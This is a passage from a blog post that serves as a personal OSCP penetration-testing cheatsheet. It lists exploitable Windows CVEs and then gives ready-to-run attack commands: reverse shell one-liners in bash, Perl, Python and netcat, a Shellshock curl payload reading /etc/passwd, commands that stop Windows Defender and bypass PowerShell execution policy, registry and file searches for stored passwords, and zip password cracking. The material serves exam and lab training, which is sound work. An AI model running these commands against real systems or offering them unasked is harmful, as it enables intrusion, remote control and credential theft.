      <td>MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution</td>
    </tr>
  </tbody>
</table>

<h5 id="windows-server-2003">Windows Server 2003</h5>

<table>
  <thead>
    <tr>
      <th style="text-align: center">CVE</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">CVE-2008-4250</td>
      <td>ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2017-8487</td>
      <td>allows an attacker to execute code when a victim opens a specially crafted file - remote code execution</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="proofs">PROOFS</h2>

<h3 id="linux-5">Linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2&gt;/dev/null; cat /Desktop/proof.txt 2&gt;/dev/null;echo " "
</code></pre></div></div>

<h3 id="windows-5">Windows</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp;  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
</code></pre></div></div>

<hr />

<h2 id="reverse-shell">REVERSE SHELL</h2>

<h3 id="amazing-tool-for-shell-generation">Amazing tool for shell generation</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Download
git clone https://github.com/ShutdownRepo/shellerator

# Install requirements
pip3 install --user -r requirements.txt

# Executable from anywhere
sudo cp shellrator.py /bin/shellrator
</code></pre></div></div>

<h3 id="bash-1">Bash</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
</code></pre></div></div>

<h3 id="perl-1">Perl</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="&lt;IP&gt;";$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre></div></div>

<h3 id="python-1">Python</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP&gt;",&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre></div></div>

<h3 id="netcat-1">Netcat</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f
</code></pre></div></div>

<h3 id="more-reverse-shell">More reverse shell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
</code></pre></div></div>

<h3 id="interactive-shell">Interactive shell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Bash
echo os.system('/bin/bash')

# Sh
/bin/bash -i

# Perl
perl -e 'exec "/bin/bash"'

# Ruby
exec "/bin/bash"

# Lua
os.execute('/bin/bash')
</code></pre></div></div>

<h3 id="adjust-interactive-shell">Adjust Interactive shell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty size # Find your terminal size -&gt; 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
</code></pre></div></div>

<hr />

<h2 id="shellshock">SHELLSHOCK</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" &lt;URL&gt;/cgi-bin/&lt;SCRIPT&gt;
</code></pre></div></div>

<hr />

<h2 id="useful-linux-commands">USEFUL LINUX COMMANDS</h2>

<h3 id="find-a-file">Find a file</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate &lt;FILE&gt;
find / -name "&lt;FILE&gt;"
</code></pre></div></div>

<h3 id="active-connection">Active connection</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -lntp
</code></pre></div></div>

<h3 id="list-all-suid-files">List all SUID files</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 2&gt;/dev/null
</code></pre></div></div>

<h3 id="determine-the-current-version-of-linux">Determine the current version of Linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat /etc/issue
</code></pre></div></div>

<h3 id="determine-more-information-about-the-environment">Determine more information about the environment</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uname -a
</code></pre></div></div>

<h3 id="list-processes-running">List processes running</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps -faux
</code></pre></div></div>

<h3 id="list-the-allowed-and-forbidden-commands-for-the-invoking-use">List the allowed (and forbidden) commands for the invoking use</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<hr />

<h2 id="useful-windows-commands">USEFUL WINDOWS COMMANDS</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s "&lt;FILE&gt;"
</code></pre></div></div>

<hr />

<h2 id="zip">ZIP</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip &gt; zip.john
john --wordlist=&lt;PASSWORDS_LIST&gt; zip.john
</code></pre></div></div>


	  </div>

		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#OSCP-ref">
					OSCP <span>(30)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#Cheatsheet-ref">
					Cheatsheet <span>(5)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/intent/tweet?text=Write-up from Liodeus on OSCP personal cheatsheet : https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html&hashtags=OSCP,Cheatsheet,"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/2020/08/11/bufferOverflow.html" title="Buffer Overflow personal cheatsheet">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/2020/10/19/OSCP-exam-report-training.html" title="OSCP exam report - training">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2021 nobody
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>

